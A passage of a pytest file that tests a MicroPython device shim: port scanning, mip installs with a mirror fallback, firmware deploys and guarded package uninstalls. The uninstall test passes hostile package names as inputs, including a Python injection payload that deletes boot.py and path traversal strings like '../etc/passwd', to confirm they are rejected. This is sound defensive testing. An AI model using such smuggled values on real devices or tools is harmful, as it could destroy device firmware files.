import base64
import json
import os
import subprocess
import sys
import threading
import time

import pytest

from serve import (
    SCRIPT_FILES,
    Shim,
    _dispatch,
    _list_files,
    iter_uploadable_firmware,
    map_install_error,
    parse_scan_output,
    resolve_schema,
    resolve_script,
    scripts_root,
    _ensure_utf8_io,
    _mpremote_env_command,
    _subprocess_text_kwargs,
    _with_mpremote_launcher,
    _run_project_script,
    _run_flash_device,
    _run_render,
    _run_simulate,
    _run_static_check,
    _run_validate,
)


def test_every_script_files_entry_resolves_to_a_real_file():
    # Every SCRIPT_FILES entry must resolve to a bundled file. render_wiring/render_diagram/
    # validate use the -plugin dirs; scaffold/download_drivers use the LEGACY (non-plugin) dirs
    # because the host dispatch passes --project-dir and expects files written to disk (only the
    # legacy scripts do that). prepare-vsce's PLUGIN_DIRS must bundle both families. Mutation:
    # drop upy-scaffold/upy-generate from PLUGIN_DIRS (or repoint to a missing dir) and this fails.
    for key in SCRIPT_FILES:
        path = resolve_script(key)
        assert os.path.exists(path), f"{key} -> {path} does not exist (dir-name/bundle mismatch)"


def test_ensure_utf8_io_forces_utf8_and_tolerates_missing_reconfigure():
    # Node pipes the shim's stdin as UTF-8; without forcing UTF-8 the shim would
    # decode it with the Windows locale codepage (gbk) and corrupt non-ASCII code.
    class FakeStream:
        def __init__(self):
            self.encoding_set = None

        def reconfigure(self, encoding=None):
            self.encoding_set = encoding

    stream = FakeStream()
    _ensure_utf8_io(stream)
    assert stream.encoding_set == "utf-8"

    # A stream without reconfigure() (older/odd wrappers) must not raise.
    _ensure_utf8_io(object())


def test_scan_parses_windows_and_macos_ports():
    ports = parse_scan_output("COM3 303A:1001 MicroPython\n/dev/tty.usbmodem1101 303A:1001 MicroPython\n")

    assert ports == ["COM3", "/dev/tty.usbmodem1101"]


def test_scan_parses_linux_ports():
    ports = parse_scan_output(
        "COM3 303A:1001 MicroPython\n"
        "/dev/ttyUSB0 2e8a:0005 MicroPython\n"
        "/dev/ttyACM0 2e8a:0005 MicroPython\n"
    )

    assert ports == ["COM3", "/dev/ttyUSB0", "/dev/ttyACM0"]


def test_scan_excludes_macos_builtin_pseudo_ports():
    # A Mac always exposes Bluetooth/debug-console callout ports; keeping them makes any
    # real board look like "multiple boards" and blocks the single-port flash/deploy path.
    ports = parse_scan_output(
        "/dev/cu.Bluetooth-Incoming-Port\n"
        "/dev/cu.debug-console\n"
        "/dev/cu.wlan-debug\n"
        "/dev/cu.wchusbserial57280348821 303A:1001 MicroPython\n"
    )

    assert ports == ["/dev/cu.wchusbserial57280348821"]


def test_install_command_uses_mpremote_mip_package_json_url():
    shim = Shim(runner=lambda cmd, **_kwargs: subprocess.CompletedProcess(cmd, 0, "", ""))

    shim.install_package("COM3", "https://upypi.net/pkgs/aht20/1.0.0/package.json")

    assert shim.commands[-1] == ["mpremote", "connect", "COM3", "resume", "mip", "install", "https://upypi.net/pkgs/aht20/1.0.0/package.json"]


def test_mpremote_runs_through_the_boot_settle_launcher():
    # A USB-serial bridge resets the board when the port opens, so mpremote's ctrl-C /
    # ctrl-A handshake lands mid-boot and every call dies with "could not enter raw repl"
    # (seen on an ESP32-WROOM-32 behind a CP2102). The launcher adds the settle mpremote
    # applies on Windows only. The swap must happen at the subprocess boundary.
    argv = _with_mpremote_launcher(["mpremote", "connect", "COM3", "reset"])

    assert argv[0] == sys.executable, "mpremote must be hosted by this interpreter"
    assert argv[1].endswith("mpremote_launcher.py")
    assert argv[2:] == ["connect", "COM3", "reset"], "the mpremote arguments must survive intact"

    # Anything that is not an mpremote call is passed through untouched.
    other = ["python", "-m", "esptool", "--chip", "esp32"]
    assert _with_mpremote_launcher(other) == other
    assert _with_mpremote_launcher([]) == []


def test_an_absolute_mpremote_path_still_gets_the_settle():
    # Matching the bare name alone was not enough. A deploy resolved mpremote with
    # shutil.which() and ran the absolute venv path, which skipped the settle: three
    # consecutive hardware runs failed their clean step with "could not enter raw repl"
    # and uploaded nothing, while the board kept running the previous run's firmware.
    resolved = os.path.join(os.path.expanduser("~"), ".mpyhw", "venv", "bin", "mpremote")
    argv = _with_mpremote_launcher([resolved, "connect", "/dev/cu.usbserial-0001", "resume"])

    assert argv[0] == sys.executable
    assert argv[1].endswith("mpremote_launcher.py")
    assert argv[2:] == ["connect", "/dev/cu.usbserial-0001", "resume"]

    # Windows spelling, and a lookalike that must NOT be swallowed.
    assert _with_mpremote_launcher([r"C:\venv\Scripts\mpremote.exe", "reset"])[1].endswith(
        "mpremote_launcher.py"
    )
    not_mpremote = ["/usr/local/bin/mpremote-helper", "reset"]
    assert _with_mpremote_launcher(not_mpremote) == not_mpremote


def test_the_deploy_plugin_is_pointed_at_the_launcher_through_its_env_hook(monkeypatch):
    # The deploy plugin resolves and spawns mpremote itself, so it never crosses this shim's
    # subprocess boundary and _with_mpremote_launcher cannot reach it. UPY_MPREMOTE is the
    # hook that does. The value has to survive the plugin's own splitter, which is
    # shlex.split(value, posix=os.name != "nt") in its mpremote_runtime.split_command.
    #
    # Whether the hook can carry anything at all depends on the CHECKOUT PATH, not on the code:
    # with posix=False the splitter keeps the quotes it finds, so a Windows path containing a
    # space cannot be expressed and _mpremote_env_command answers None by design (the test below
    # states that rule). Asserting the value is always set therefore passed on CI, whose runner
    # path has no spaces, and failed on every Windows checkout under `C:\\Users\\First Last\\...`
    # -- `npm run baseline` red on the maintainer's own machine, saying nothing about the code.
    # Pin the rule instead: whatever IS handed over must round-trip, and handing over nothing
    # must be because the path cannot carry it, never because the redirect stopped working.
    import shlex

    import serve

    value = _subprocess_text_kwargs()["env"].get("UPY_MPREMOTE")
    if value is None:
        assert " " in sys.executable or " " in serve._MPREMOTE_LAUNCHER, (
            "no mpremote redirect was handed over, and the path it would carry has no space, "
            "so this is a broken hook rather than an inexpressible one"
        )
        # Without this the branch is vacuous: on any spaced checkout a completely dead
        # _mpremote_env_command would return None too, and the test would pass forever.
        monkeypatch.setattr(serve, "_MPREMOTE_LAUNCHER", "/opt/shim/mpremote_launcher.py")
        monkeypatch.setattr(os, "name", "posix")
        rebuilt = serve._mpremote_env_command()
        assert rebuilt, "the redirect is dead even where the path can carry it"
        assert shlex.split(rebuilt, posix=True) == [sys.executable, "/opt/shim/mpremote_launcher.py"]
        return

    parts = shlex.split(value, posix=os.name != "nt")
    assert parts[0] == sys.executable, "the launcher must be hosted by this interpreter"
    assert parts[1].endswith("mpremote_launcher.py")
    assert os.path.isfile(parts[1]), "the redirected path must actually exist"


def test_an_operator_set_mpremote_command_outranks_ours(monkeypatch):
    monkeypatch.setenv("UPY_MPREMOTE", "/opt/custom/mpremote")
    assert _subprocess_text_kwargs()["env"]["UPY_MPREMOTE"] == "/opt/custom/mpremote"


def test_no_mpremote_command_is_handed_over_that_the_plugin_cannot_parse(monkeypatch):
    # posix=False keeps the quotes it finds, so a Windows path with a space cannot be
    # expressed through this variable at all. Handing one over anyway would point the plugin
    # at a path that does not exist; unset is the honest answer, and it falls back to
    # shutil.which(). Guard the rule rather than the platform we happen to run the suite on.
    import shlex

    import serve

    monkeypatch.setattr(serve, "_MPREMOTE_LAUNCHER", r"C:\Users\First Last\shim\launcher.py")
    monkeypatch.setattr(os, "name", "nt")
    value = serve._mpremote_env_command()
    if value is not None:
        assert shlex.split(value, posix=False) == [sys.executable, serve._MPREMOTE_LAUNCHER]


def test_launcher_only_delays_for_boards_that_reset_on_open():
    import mpremote_launcher as launcher

    class Port:
        def __init__(self, device, vid):
            self.device = device
            self.vid = vid

    ports = [
        Port("/dev/cu.usbserial-0001", 0x10C4),  # CP2102 bridge: resets on open
        Port("/dev/cu.usbmodem101", 0x2E8A),     # Pico native USB CDC: does not
    ]
    assert launcher.resets_on_open("/dev/cu.usbserial-0001", ports) is True
    assert launcher.resets_on_open("/dev/cu.usbmodem101", ports) is False
    # An unknown port must NOT pay the delay on every call of a deploy.
    assert launcher.resets_on_open("/dev/cu.nothere", ports) is False
    assert launcher.resets_on_open("/dev/cu.usbserial-0001", []) is False

    # The port is read from the mpremote argument vector, including the port: prefix.
    assert launcher.target_device(["connect", "COM7", "reset"]) == "COM7"
    assert launcher.target_device(["connect", "port:/dev/ttyUSB0", "ls"]) == "/dev/ttyUSB0"
    assert launcher.target_device(["connect", "auto", "ls"]) is None
    assert launcher.target_device(["connect", "list"]) is None
    assert launcher.target_device(["ls"]) is None
    assert launcher.target_device(["connect"]) is None, "a trailing connect has no device to read"


def test_uninstall_package_removes_lib_paths_guards_name_and_treats_absent_as_ok(monkeypatch):
    import serve

    calls = []

    def fake_run(args, timeout=30):
        calls.append(args)
        removed = args[-1].endswith(".mpy")  # only the .mpy candidate exists
        return subprocess.CompletedProcess(args, 0 if removed else 1, "", "" if removed else "no such file")

    monkeypatch.setattr(serve, "_run_mpremote", fake_run)
    res = serve._uninstall_package("COM3", "aioble")
    assert res == {"status": "ok", "removed": True}
    # A bare name first probes /lib/<name>/ with `fs ls` (shared-namespace guard); the removal
    # candidates are the `fs rm` calls that follow.
    rm_calls = [a for a in calls if a[3:5] == ["fs", "rm"]]
    assert [a[-1] for a in rm_calls] == [":/lib/aioble", ":/lib/aioble.mpy", ":/lib/aioble.py"]
    assert all(a[:5] == ["connect", "COM3", "resume", "fs", "rm"] and "-r" in a for a in rm_calls)

    # A name with a path separator is rejected without running mpremote at all.
    calls.clear()
    bad = serve._uninstall_package("COM3", "../etc/passwd")
    assert bad["status"] == "error" and bad["error_kind"] == "invalid_package_name"
    assert calls == []

    # Nothing installed under that name -> success (removed False), not an error.
    monkeypatch.setattr(serve, "_run_mpremote", lambda args, timeout=30: subprocess.CompletedProcess(args, 1, "", "no such file"))
    assert serve._uninstall_package("COM3", "notthere") == {"status": "ok", "removed": False}

    # A REAL failure on a present path must NOT be masked by later absent candidates.
    def real_error_then_absent(args, timeout=30):
        if args[-1].endswith(".mpy") or args[-1].endswith(".py"):
            return subprocess.CompletedProcess(args, 1, "", "no such file")
        return subprocess.CompletedProcess(args, 1, "", "could not remove: directory not empty")

    monkeypatch.setattr(serve, "_run_mpremote", real_error_then_absent)
    res = serve._uninstall_package("COM3", "aioble")
    assert res["status"] == "error" and res["error_kind"] == "mpremote_error"
    assert "directory not empty" in res["message"]

    # RCE guard (finding 1): an injection payload (quotes/;/parens/#) is rejected by the
    # allowlist without ever reaching mpremote (which raw-interpolates the name into
    # on-device Python). A blocklist that only rejected "/" would let this through.
    calls.clear()
    evil = serve._uninstall_package("COM3", "x');__import__('os').remove(chr(47)+'boot.py');#")
    assert evil["status"] == "error" and evil["error_kind"] == "invalid_package_name"
    assert calls == []

    # A guard REWRITE must re-cover the old blocklist's cases: a bare "." (-> rm -r :/lib/. wipes
    # all of /lib) and ".." must be rejected without any mpremote call.
    for traversal in (".", ".."):
        calls.clear()
        bad = serve._uninstall_package("COM3", traversal)
        assert bad["status"] == "error" and bad["error_kind"] == "invalid_package_name"
        assert calls == []

    # Finding 3: a real failure on a present path is an error even when ANOTHER candidate was
    # removed -- the old `real_err and not removed` masked this as "Removed".
    def removed_dir_then_real_error(args, timeout=30):
        if args[-1] == ":/lib/aioble":
            return subprocess.CompletedProcess(args, 0, "", "")            # dir removed
        if args[-1].endswith(".mpy"):
            return subprocess.CompletedProcess(args, 1, "", "[Errno 21] EISDIR")  # real failure
        return subprocess.CompletedProcess(args, 1, "", "no such file")
    monkeypatch.setattr(serve, "_run_mpremote", removed_dir_then_real_error)
    res = serve._uninstall_package("COM3", "aioble")
    assert res["status"] == "error" and res["error_kind"] == "mpremote_error"

    # Finding 5: a dotted package installs nested (umqtt.simple -> /lib/umqtt/simple.py),
    # so the nested file forms must be probed too, or a dotted name is a false "Removed".
    calls.clear()
    def record_absent(args, timeout=30):
        calls.append(args)
        return subprocess.CompletedProcess(args, 1, "", "no such file")
    monkeypatch.setattr(serve, "_run_mpremote", record_absent)
    serve._uninstall_package("COM3", "umqtt.simple")
    probed = [a[-1] for a in calls]
    assert ":/lib/umqtt/simple.py" in probed and ":/lib/umqtt/simple.mpy" in probed
    # Must NOT rm the shared namespace dir -- that would take sibling umqtt.* packages with it.
    assert ":/lib/umqtt" not in probed


def test_uninstall_reads_stdout_errors_and_flags_unexplained_nonzero(monkeypatch):
    import serve

    # The namespace guard lists /lib/<name>/ first; these tests target the REMOVAL loop, so the
    # ls returns a single-package listing (__init__.mpy present -> not a shared namespace -> proceed).
    one_package_ls = subprocess.CompletedProcess(["ls"], 0, "         0 __init__.mpy\n", "")

    # mpremote writes some rm failures to STDOUT, not stderr. A real error there must SURFACE,
    # not be masked into "Removed" (PR #45 finding: the loop read only stderr).
    def stdout_error(args, timeout=30):
        if args[3:5] == ["fs", "ls"]:
            return one_package_ls
        return subprocess.CompletedProcess(args, 1, "Permission denied", "")  # error on STDOUT
    monkeypatch.setattr(serve, "_run_mpremote", stdout_error)
    res = serve._uninstall_package("COM3", "aioble")
    assert res["status"] == "error" and res["error_kind"] == "mpremote_error"
    assert "Permission denied" in res["message"]  # reverting to stderr-only loses this message

    # A non-zero exit with NO message anywhere, and nothing removed, is a real error -- never a
    # silent "nothing was installed" success.
    def silent_fail(args, timeout=30):
        if args[3:5] == ["fs", "ls"]:
            return one_package_ls
        return subprocess.CompletedProcess(args, 1, "", "")  # non-zero, no output, on every rm
    monkeypatch.setattr(serve, "_run_mpremote", silent_fail)
    res = serve._uninstall_package("COM3", "aioble")
    assert res["status"] == "error" and res["error_kind"] == "mpremote_error"

    # But an unexplained non-zero on a probe candidate that didn't need to exist, ALONGSIDE a real
    # removal, is still success -- the removal is trusted.
    def removed_then_silent(args, timeout=30):
        if args[3:5] == ["fs", "ls"]:
            return one_package_ls
        if args[-1] == ":/lib/aioble" and args[3:5] == ["fs", "rm"]:
            return subprocess.CompletedProcess(args, 0, "", "")  # dir removed
        return subprocess.CompletedProcess(args, 1, "", "")  # silent non-zero (other rm candidates)
    monkeypatch.setattr(serve, "_run_mpremote", removed_then_silent)
    assert serve._uninstall_package("COM3", "aioble") == {"status": "ok", "removed": True}


def test_uninstall_refuses_shared_namespace_but_removes_regular_package(monkeypatch):
    import serve

    # A bare name whose /lib/<name>/ is a shared namespace (no __init__.py, >1 module) must be
    # REFUSED, not `rm -r`ed -- that would wipe sibling packages (umqtt/ = simple.py + robust.py).
    calls = []

    def namespace_dir(args, timeout=30):
        calls.append(args)
        if args[3:5] == ["fs", "ls"] and args[-1] == ":/lib/umqtt":
            return subprocess.CompletedProcess(args, 0, "         0 simple.py\n         0 robust.py\n", "")
        return subprocess.CompletedProcess(args, 0, "", "")
    monkeypatch.setattr(serve, "_run_mpremote", namespace_dir)
    res = serve._uninstall_package("COM3", "umqtt")
    assert res["status"] == "error" and res["error_kind"] == "shared_namespace"
    assert "umqtt.simple" in res["message"] and "umqtt.robust" in res["message"]
    assert all(a[3:5] != ["fs", "rm"] for a in calls)  # refusing means it issued NO rm

    # A regular package dir is ONE unit -> removed whole (not refused). Real shape: `mip install`
    # defaults to COMPILED .mpy, so aioble lands as __init__.mpy + core.mpy + ... with NO
    # __init__.py (verified against mip.py args.mpy=True + the live index). The carve-out must
    # accept __init__.mpy, else the feature's own happy path (install then uninstall) is refused.
    calls.clear()

    def package_dir(args, timeout=30):
        calls.append(args)
        if args[3:5] == ["fs", "ls"] and args[-1] == ":/lib/aioble":
            return subprocess.CompletedProcess(
                args, 0, "         0 __init__.mpy\n         0 core.mpy\n         0 device.mpy\n", "")
        return subprocess.CompletedProcess(args, 0, "", "")
    monkeypatch.setattr(serve, "_run_mpremote", package_dir)
    res = serve._uninstall_package("COM3", "aioble")
    assert res["status"] == "ok"
    assert any(a[3:5] == ["fs", "rm"] for a in calls)  # __init__.mpy carve-out lets it remove

    # Fail closed: an ls that fails for a NON-absent reason (busy/comms) can't verify the dir isn't
    # a shared namespace, so the destructive rm -r is refused rather than risked.
    calls.clear()

    def ls_busy(args, timeout=30):
        calls.append(args)
        if args[3:5] == ["fs", "ls"]:
            return subprocess.CompletedProcess(args, 1, "", "could not access port: device busy")
        return subprocess.CompletedProcess(args, 0, "", "")
    monkeypatch.setattr(serve, "_run_mpremote", ls_busy)
    res = serve._uninstall_package("COM3", "aioble")
    assert res["status"] == "error" and res["error_kind"] == "mpremote_error"
    assert "could not list" in res["message"]
    assert all(a[3:5] != ["fs", "rm"] for a in calls)  # nothing removed on an unverifiable listing

    # But an ABSENT ls (the common flat-module case: /lib/<name> the dir doesn't exist) is safe to
    # proceed -- the flat-module candidates still run.
    calls.clear()

    def ls_absent_then_ok(args, timeout=30):
        calls.append(args)
        if args[3:5] == ["fs", "ls"]:
            return subprocess.CompletedProcess(args, 1, "", "ls: :/lib/flatmod: No such file or directory.")
        removed = args[-1].endswith(".py")
        return subprocess.CompletedProcess(args, 0 if removed else 1, "", "" if removed else "No such file")
    monkeypatch.setattr(serve, "_run_mpremote", ls_absent_then_ok)
    res = serve._uninstall_package("COM3", "flatmod")
    assert res == {"status": "ok", "removed": True}

    # Finding 3b: _is_absent anchors errno 2 -- errno 20-29 are real failures, not "absent".
    assert serve._is_absent("[Errno 2] ENOENT: no such file") is True
    assert serve._is_absent("[Errno 28] ENOSPC: no space left on device") is False
    assert serve._is_absent("[Errno 21] EISDIR") is False


def test_is_shared_namespace_pure_classification():
    """Property-style: over the real /lib listing shapes, refuse iff there is NO package __init__
    (neither .py nor .mpy) AND >1 entry; NEVER refuse a dir that carries an __init__, whatever the
    other entries are. The forbidden output is 'refuse a real package'."""
    import serve

    # Any listing containing a package __init__ (either form) is one package -> never shared.
    for init in ("__init__.py", "__init__.mpy"):
        for others in ([], ["core.mpy"], ["core.mpy", "device.mpy", "server.mpy"], ["a.py", "b.py"]):
            assert serve._is_shared_namespace([init] + others) is False, (init, others)

    # No __init__ + >1 entry -> shared namespace (the umqtt hazard), regardless of file extension.
    assert serve._is_shared_namespace(["simple.py", "robust.py"]) is True
    assert serve._is_shared_namespace(["simple.mpy", "robust.mpy"]) is True
    assert serve._is_shared_namespace(["a.py", "b.mpy", "c.py"]) is True
    assert serve._is_shared_namespace(["simple/", "robust/"]) is True  # dir entries count too

    # No __init__ but <=1 entry -> not shared (a lone module dir removes cleanly).
    assert serve._is_shared_namespace([]) is False
    assert serve._is_shared_namespace(["only.py"]) is False

    # Whitespace / trailing-slash normalization must not defeat the __init__ carve-out.
    assert serve._is_shared_namespace(["  __init__.mpy  ", "core.mpy"]) is False


def test_write_device_file_mkdirs_parents_then_copies_to_mirror_path():
    shim = Shim(runner=lambda cmd, **_kwargs: subprocess.CompletedProcess(cmd, 0, "", ""))

    shim.write_device_file("COM3", "lib/aht20.py", "/tmp/aht20.py")

    # Parent dir created best-effort, then the file copied to its mirror device path.
    assert shim.commands[-2] == ["mpremote", "connect", "COM3", "resume", "fs", "mkdir", ":lib"]
    assert shim.commands[-1] == ["mpremote", "connect", "COM3", "resume", "fs", "cp", "/tmp/aht20.py", ":lib/aht20.py"]


def test_write_device_file_top_level_file_skips_mkdir():
    shim = Shim(runner=lambda cmd, **_kwargs: subprocess.CompletedProcess(cmd, 0, "", ""))

    shim.write_device_file("COM3", "boot.py", "/tmp/boot.py")

    assert shim.commands == [["mpremote", "connect", "COM3", "resume", "fs", "cp", "/tmp/boot.py", ":boot.py"]]


def test_dispatch_write_device_file_stages_content_b64_as_bytes():
    # Device Tools upload sends content_b64 (raw bytes). It must stage byte-for-byte in
    # binary mode — a UTF-8 text path would replace invalid bytes with U+FFFD. The codegen
    # `code` (str) path must stay unchanged.
    staged = {}

    def runner(cmd, **_k):
        if "cp" in cmd:  # cp <staged-tmp> :<device-path>
            with open(cmd[-2], "rb") as f:
                staged["bytes"] = f.read()
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)

    raw = bytes([0xFF, 0xFE, 0x00, 0x89])  # not valid UTF-8
    res = _dispatch(shim, "device.write_device_file", {"port": "COM3", "path": "boot.mpy", "content_b64": base64.b64encode(raw).decode()})
    assert res["status"] == "ok"
    assert staged["bytes"] == raw, "binary upload round-trips byte-for-byte"

    res2 = _dispatch(shim, "device.write_device_file", {"port": "COM3", "path": "boot.py", "code": "print('hi')"})
    assert res2["status"] == "ok"
    assert staged["bytes"] == b"print('hi')", "the codegen str path is unchanged"


def test_deploy_firmware_tree_strips_prefix_and_mkdirs_parents(tmp_path):
    fw = tmp_path / "firmware"
    (fw / "lib").mkdir(parents=True)
    (fw / "lib" / "ssd1306.py").write_text("class SSD1306: pass", encoding="utf-8")
    (fw / "boot.py").write_text("# boot", encoding="utf-8")
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))

    result = shim.deploy_firmware_tree("COM3", str(fw))

    assert result == {"status": "ok"}
    targets = [c[-1] for c in shim.commands if c[4] == "fs" and c[5] == "cp"]
    # firmware/ prefix stripped: contents map to the device root (so bare imports resolve).
    assert ":lib/ssd1306.py" in targets
    assert ":boot.py" in targets
    # the lib parent dir is created (best-effort) before its file is copied.
    assert ["mpremote", "connect", "COM3", "resume", "fs", "mkdir", ":lib"] in shim.commands


def test_deploy_firmware_tree_uploads_main_py_last(tmp_path):
    fw = tmp_path / "firmware"
    (fw / "lib").mkdir(parents=True)
    (fw / "lib" / "x.py").write_text("x", encoding="utf-8")
    (fw / "boot.py").write_text("b", encoding="utf-8")
    (fw / "main.py").write_text("m", encoding="utf-8")
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))

    shim.deploy_firmware_tree("COM3", str(fw))

    cps = [c for c in shim.commands if c[4] == "fs" and c[5] == "cp"]
    # main.py is copied AFTER every dependency, so it does not autorun before deps land.
    assert cps[-1][-1] == ":main.py"


def test_deploy_firmware_tree_missing_dir_returns_error_without_commands(tmp_path):
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))

    result = shim.deploy_firmware_tree("COM3", str(tmp_path / "nope" / "firmware"))

    assert result == {"status": "error", "error_kind": "firmware_dir_missing"}
    assert shim.commands == []


def test_deploy_firmware_tree_maps_cp_failure(tmp_path):
    fw = tmp_path / "firmware"
    fw.mkdir()
    (fw / "main.py").write_text("m", encoding="utf-8")
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 1, "", "device busy"))

    result = shim.deploy_firmware_tree("COM3", str(fw))

    assert result["status"] == "error"
    assert result["error_kind"] == "port_busy"


def test_deploy_firmware_tree_skips_gitkeep_and_only_walks_firmware(tmp_path):
    # The firmware/ tree IS the device image; sibling project files (manifest, docs,
    # PC tests) live OUTSIDE firmware/ and must never reach the board.
    fw = tmp_path / "firmware"
    (fw / "lib").mkdir(parents=True)
    (fw / "lib" / ".gitkeep").write_text("", encoding="utf-8")
    (fw / "tasks").mkdir()
    (fw / "tasks" / "sensor.py").write_text("def tick(): pass", encoding="utf-8")
    (tmp_path / "project-manifest.json").write_text("{}", encoding="utf-8")
    (tmp_path / "docs").mkdir()
    (tmp_path / "docs" / "diagram.json").write_text("{}", encoding="utf-8")
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))

    shim.deploy_firmware_tree("COM3", str(fw))

    targets = [c[-1] for c in shim.commands if c[4] == "fs" and c[5] == "cp"]
    # Only the firmware/ .py file ships — no .gitkeep, no manifest/docs siblings.
    assert targets == [":tasks/sensor.py"]


def test_deploy_firmware_tree_excludes_mocks_pycache_and_flash_images(tmp_path):
    # The contract bug this fixes: previously only .gitkeep was skipped here, so a
    # driver's mock.py/mock.mpy test double, a __pycache__ .pyc, and a flash image all
    # shipped to the board (the reported "takes up the board's memory" complaint).
    # A NESTED .bin (a real driver asset, e.g. GraftSense's bma423_driver ships
    # bma423conf.bin next to its .py and reads it back at runtime) must still deploy --
    # only a TOP-LEVEL flash image is a flash-phase input, never a device-fs file.
    fw = tmp_path / "firmware"
    (fw / "drivers" / "foo_driver").mkdir(parents=True)
    (fw / "drivers" / "foo_driver" / "__init__.py").write_text("class Foo: pass", encoding="utf-8")
    (fw / "drivers" / "foo_driver" / "mock.py").write_text("class MockFoo: pass", encoding="utf-8")
    (fw / "drivers" / "foo_driver" / "mock.mpy").write_bytes(b"\x00")
    (fw / "drivers" / "foo_driver" / "foo_conf.bin").write_bytes(b"\x00")
    (fw / "__pycache__").mkdir()
    (fw / "__pycache__" / "boot.cpython-312.pyc").write_bytes(b"\x00")
    (fw / "RPI_PICO-20260406-v1.28.0.uf2").write_bytes(b"\x00")
    (fw / "main.py").write_text("m", encoding="utf-8")
    shim = Shim(runner=lambda cmd, **_k: subprocess.CompletedProcess(cmd, 0, "", ""))

    result = shim.deploy_firmware_tree("COM3", str(fw))

    assert result == {"status": "ok"}
    targets = [c[-1] for c in shim.commands if c[4] == "fs" and c[5] == "cp"]
    assert ":drivers/foo_driver/__init__.py" in targets
    assert ":drivers/foo_driver/foo_conf.bin" in targets, "a nested .bin is a device asset, not a flash image"
    assert ":drivers/foo_driver/mock.py" not in targets
    assert ":drivers/foo_driver/mock.mpy" not in targets
    assert not any(t.endswith(".pyc") for t in targets)
    assert not any(t.endswith(".uf2") for t in targets)
    assert targets[-1] == ":main.py"


def test_iter_uploadable_firmware_excludes_top_level_flash_images_but_keeps_nested_device_assets(tmp_path):
    # *.uf2/*.bin/*.hex are excluded ONLY at firmware/'s top level, where a flash image
    # actually lands. Nested under firmware/lib/ or firmware/drivers/, a .bin/.hex is a
    # legitimate device-side driver asset (read back from the device fs at runtime) --
    # excluding it there silently breaks the driver, which is what this test locks.
    fw = tmp_path / "firmware"
    (fw / "lib").mkdir(parents=True)
    (fw / "lib" / "keep.py").write_text("k", encoding="utf-8")
    (fw / "lib" / "image.bin").write_bytes(b"\x00")
    (fw / "top_level.bin").write_bytes(b"\x00")
    (fw / "firmware.hex").write_text(":00000001FF", encoding="utf-8")
    (fw / "RPI_PICO.uf2").write_bytes(b"\x00")

    rels = sorted(rel for _src, rel in iter_uploadable_firmware(str(fw)))

    assert rels == ["lib/image.bin", "lib/keep.py"]


def test_install_errors_are_classified():
    assert map_install_error("No such package") == "package_not_found"
    assert map_install_error("network unreachable") == "network"
    assert map_install_error("device busy") == "port_busy"
    assert map_install_error("incompatible chip") == "incompatible_chip"
    assert map_install_error("other") == "mpremote_error"


def test_install_failure_returns_classified_error_plus_raw_stderr():
    # The classified category ("network") tells you the kind; the raw mpremote stderr
    # tells you the actual cause (e.g. which host couldn't be resolved). Keep BOTH so a
    # failed install is diagnosable, not just bucketed.
    def runner(cmd, **_k):
        if "mip" in cmd:
            return subprocess.CompletedProcess(cmd, 1, "", "mpremote: network error: could not resolve host raw.githubusercontent.com")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    result = shim.install_package("COM3", "github:org/repo/sensors/dht11_driver")

    assert result["ok"] is False
    assert result["error"] == "network"
    assert "raw.githubusercontent.com" in result["message"]


def test_install_graftsense_mirror_uses_the_caller_supplied_version():
    # GraftSense's github: install URL is unreachable from mainland China. The driver
    # is mirrored on upypi, so try that FIRST — but the upypi URL needs a version, and
    # we use the REAL pinned version threaded from the manifest (never a hardcoded one).
    cmds = []

    def runner(cmd, **_k):
        cmds.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    result = shim.install_package("COM3", "github:FreakStudioCN/GraftSense-Drivers-MicroPython/sensors/dht11_driver", "2.3.0")

    assert result["ok"] is True
    mip = [c for c in cmds if "mip" in c]
    assert mip[0][-1] == "https://upypi.net/pkgs/dht11_driver/2.3.0/package.json", "uses the supplied version, not a hardcoded 1.0.0"
    assert all("github:" not in c[-1] for c in mip), "github never attempted when the upypi mirror works"


def test_install_graftsense_falls_back_to_github_when_upypi_misses():
    # Not every GraftSense driver is mirrored on upypi (or the pinned version differs).
    # When the upypi mirror 404s, fall back to the original github URL so non-China
    # users (and unmirrored drivers) are never regressed.
    cmds = []

    def runner(cmd, **_k):
        cmds.append(cmd)
        if "mip" in cmd and "upypi.net" in cmd[-1]:
            return subprocess.CompletedProcess(cmd, 1, "", "Package not found")
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    result = shim.install_package("COM3", "github:FreakStudioCN/GraftSense-Drivers-MicroPython/misc/passive_buzzer_driver", "1.0.0")

    assert result["ok"] is True
    mip_targets = [c[-1] for c in cmds if "mip" in c]
    assert mip_targets == [
        "https://upypi.net/pkgs/passive_buzzer_driver/1.0.0/package.json",
        "github:FreakStudioCN/GraftSense-Drivers-MicroPython/misc/passive_buzzer_driver",
    ]


def test_install_graftsense_without_a_version_skips_the_mirror():
    # No version to build a real upypi URL with -> don't guess one. Install the github
    # URL as given (degrades to current behavior) rather than fabricating a version.
    cmds = []

    def runner(cmd, **_k):
        cmds.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    shim.install_package("COM3", "github:FreakStudioCN/GraftSense-Drivers-MicroPython/sensors/dht11_driver")

    mip = [c for c in cmds if "mip" in c]
    assert len(mip) == 1
    assert mip[0][-1] == "github:FreakStudioCN/GraftSense-Drivers-MicroPython/sensors/dht11_driver"
    assert all("upypi.net" not in c[-1] for c in mip)


def test_install_non_graftsense_url_is_attempted_directly_no_mirror():
    # A direct package.json URL (e.g. upypi) has no GraftSense mirror to try — install
    # it as-is, exactly once. Guards against rewriting unrelated install sources.
    cmds = []

    def runner(cmd, **_k):
        cmds.append(cmd)
        return subprocess.CompletedProcess(cmd, 0, "", "")

    shim = Shim(runner=runner)
    shim.install_package("COM3", "https://upypi.net/pkgs/aht20/1.0.0/package.json")

    mip = [c for c in cmds if "mip" in c]
    assert len(mip) == 1
    assert mip[0][-1] == "https://upypi.net/pkgs/aht20/1.0.0/package.json"


def test_dispatch_install_failure_propagates_error_kind_and_raw_message():
